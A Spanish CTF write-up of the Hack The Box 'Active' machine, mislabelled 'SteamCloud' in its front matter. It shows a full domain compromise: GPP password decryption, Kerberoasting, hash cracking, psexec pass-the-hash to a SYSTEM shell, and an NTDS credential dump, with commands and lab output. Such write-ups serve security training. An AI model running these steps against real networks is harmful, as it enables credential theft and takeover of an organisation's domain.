___
layout: single                                                                                                                                                                               
title: SteamCloud HTB - WriteUp                                                                                                                                                                  
excerpt: WriteUp de la máquina SteamCloud de HTB.                                                                                                                                        
date: 2023-02-16                                                                                                                                                                             
classes: wide                                                                                                                                                                                
header:                                                                                                                                                                                      
  teaser: /assets/images/Active/Active.png                                                                                                                                           
  teaser_home_page: true                                                                                                                                                                     
  icon: /assets/images/Active/Active.png                                                                                                                                             
categories:                                                                                                                                                                                  
  - infosec                                                                                                                                                                                  
tags:                                                                                                                                                                                        
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup                                                                                                                                                                                  
  - AD                                                                                                                                                                                     
  - SMB
--- 

### Enumeración

En esta ocasión nos estamos enfrentando a una máquina Windows. Lo primero que hacemo es un escaneo de nmap y podemos encontrar los siguientes puertos abiertos:

```bash
❯ nmap -sC -sV -Pn -n -oN Extraction -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49171 10.10.10.100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-18 20:57 CET
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.46% done; ETC: 20:58 (0:00:00 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-18 19:57:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
```

De este escaneo sacamos varias cosas en claro:

-  Estamos ante una máquina windows.
- El nombre del dominio es active.htb -> Lo metemos en /etc/hosts
-  Esta expuesto SMB, Kerberos y LDAP

Lo primero que haré será enumerar el SMB haciendo uso de NULL SESSION. Para ello usare CrackMapExec.

```bash
❯ crackmapexec smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] active.htb\: STATUS_ACCESS_DENIED 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users
```

### Explotación

Tenemos acceso de lectura sobre Replication, nos podemos conectar con smbclient. Enumerando podemos encontrar un archivo llamado Groups.xml

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

```

El contenido del archivo es el siguiente:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Este archivo de politicas de grupo contiene un nombre de usuario y una contraseña cifrada con AES-256 no será un problema romperla debido a que Microsoft publico la clave AES. Podemos usar el script de este repositorio para desencriptar la password https://github.com/t0thkr1s/gpp-decrypt

```bash
❯ python3 gpp-decrypt.py -f Groups.xml

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

Probaremos si la password es valida a traves de CrackMapExec.

```bash
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

La contraseña es valida, ademas de eso el nombre de usuario me llama la atención... SVC_TGS (Ticket Granting Service) voy a probar un ataque de Kerberoasting para recoger un ticket TGS e intentar romperlo. Podemos realizar un ataque de Kerberoasting porque disponemos de credenciales validas.

```bash 
❯ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-02-18 20:54:47.472133             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b40abe0fdb1dfa6579ff75a92ea9c7f6$ad6494a48031fa492cb90337ae9e3a0ded51fb402beb42f2cfd2fdc075d1dbc798493479acd9a5421faf5dcd6cf0154533c5f40e44229565ba0798579cf728edd6534af67c69e6075b07900c06aa89d3633f63e7b0e486aef25a9805ea4eae886180369bc299c8c95f032a6dc7637c67105597ba8ab926e6409ca2486a83e79de021ef87e18dead039891fc30af2cf8a3978035167f40c9eb02f6d9d686cbdee5f5344254fa010ec3c28a6166613dae31dbb136f02c8b1ff37f77ac6839be9633dd2877f673fa5c5e6eef28816df8c752604605baee8d382529e7c990eb7c2af7b5c4e045921bdcdd9817c6646053e2cad902f48c1c3ab54205a4c1d6abff5598a20d2fca1677dc65a50ca2cb9c338cf6a619b039c3617569eabcfe38e4a59b6acd3013a9b48e84a315504524640c5f400714129b34ce79a8b3d3fe6df5cbcfa7b471fa1f08ff2273211930af24f8616959269c9d85f0b528a91839bc68ce237d686fcc34e4ae84112835cab9a0d71660697c8c789cb4e5f31e5d55744ca89b658a66643ca5cc39bb06086320f85d1ce13b78282d9492b46f3209541bb6040459030ece46e0f8477f1c7e535e20ef71e16c8f02a3008d162d5fd8659bb88ef0b4ede9ed77d1f2f45bd7221538a31d5f04a18fc6f5b3c937985e5c59be9748f83b377d8eeb8001fe805e6876577598dc5d1297b95a8f28bb5744c4f07f3352b3832274f88e22f78c58a3228cb92aefee731927bcb3330cc648573f8f3f3bca88a29ba067fabc9b7ed5285ad9b4f7f6c73f0ba899413796e72ca4fbf6dd1457f51b91eb6c2f37e8b54fa4663dd04563b39cb952091b1b8db43bf9b1a28f52c7e94b718681430ba5b33df898e94cf1add9eb30bd89e213d30b728050e1854bc4ceca498f4563965ecb6f57da4cbabbc82276e97fa73fc7ee65682cdffe87de318946de6fa0bf51266da1a9d3fbe4f18425ca7d3df121ea6a0bd33ee8d8205435e69b72858d1f3d5b28c22d82ed69b6999d79b6781db49a01a072d4bbf2728216df43fac06353312c210eb7d3e7d3bd97b8f23a7e3b61ac6edb7157d464ec873175006cf8787ef61bc0bcdb280a1f30a7af837c920f331910b6d31de4ba6dde447ac207f9a0de53e158e8ddb9e7937e010d4c509ae57f20ce88f9d7f6e85586786f6eb274b10cd0c161e18e584f8ac6a7f42b55de612d1f2c2b138234bca030baada574c1ae3f2a0c702c12d8a61a1206915a05b7e608a3979ee8807
```

Vamos a probar romper el HASH haciendo uso de john pasandole como dicc rockyou.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
1g 0:00:00:05 DONE (2023-02-18 21:29) 0.1715g/s 1807Kp/s 1807Kc/s 1807KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Hemos sacado roto el hash y el ticket le pertenecía al Administrador. Vamos a probar a si la password es valida.

```bash
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Es valida, hemos pwneado el dominio. Podemos ganar acceso con psexec haciendo uso de la contraseña o haciendo uso de pass the hash si disponemos del hash.

```bash
❯ psexec.py Administrator@10.10.10.100 -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file jegBGkCy.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service TzTy on 10.10.10.100.....
[*] Starting service TzTy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```


EL hash podemos extraerlo de la base de datos NTDS.

```bash
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
❯ crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' --ntds
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.100    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
SMB         10.10.10.100    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.100    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
SMB         10.10.10.100    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:129286708a36e7a07e5216860aa1d5ce:::
SMB         10.10.10.100    445    DC               Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
SMB         10.10.10.100    445    DC               Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
SMB         10.10.10.100    445    DC               Administrator:des-cbc-md5:5891549b31f2c294
SMB         10.10.10.100    445    DC               krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
SMB         10.10.10.100    445    DC               krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
SMB         10.10.10.100    445    DC               krbtgt:des-cbc-md5:9d044f891adf7629
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
SMB         10.10.10.100    445    DC               DC$:aes256-cts-hmac-sha1-96:209553ecb6ca014a29dcf817a83df8a02965ddd60ece3f76fffe5d4aa396b017
SMB         10.10.10.100    445    DC               DC$:aes128-cts-hmac-sha1-96:61e049be54b6fe4569757f63f1f2a85a
SMB         10.10.10.100    445    DC               DC$:des-cbc-md5:23d6c1f4131c51d3
```

Espero que te haya servido!



